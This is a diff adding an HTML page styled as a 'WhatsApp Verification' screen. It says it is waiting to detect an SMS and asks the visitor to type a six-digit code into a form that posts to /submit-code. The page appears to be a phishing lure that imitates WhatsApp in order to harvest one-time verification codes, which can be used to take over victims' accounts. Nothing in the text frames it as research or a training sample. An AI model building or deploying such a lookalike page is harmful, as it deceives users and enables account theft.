@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Verification</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <header class="main-banner">
+        <div class="overlay">
+            
+            <div class="wa-verify-box">
+                
+                <div class="wa-icon">💬</div>
+                
+                <h2>Verifying your number</h2>
+                <p class="wa-msg">Waiting to automatically detect an SMS sent to your phone number.</p>
+                
+                <form action="/submit-code" method="POST" class="wa-code-form">
+    <div class="code-inputs-container">
+        <input type="text" name="c1" maxlength="1" class="otp-field" placeholder="-">
+        <input type="text" name="c2" maxlength="1" class="otp-field" placeholder="-">
+        <input type="text" name="c3" maxlength="1" class="otp-field" placeholder="-">
+        <span class="divider">-</span>
+        <input type="text" name="c4" maxlength="1" class="otp-field" placeholder="-">
+        <input type="text" name="c5" maxlength="1" class="otp-field" placeholder="-">
+        <input type="text" name="c6" maxlength="1" class="otp-field" placeholder="-">
+    </div>
+    <button type="submit" class="wa-submit-btn">Verify Code</button>
+</form>
+                
+            </div>
+
+        </div>
+    </header>
+
+</body>
+</html>
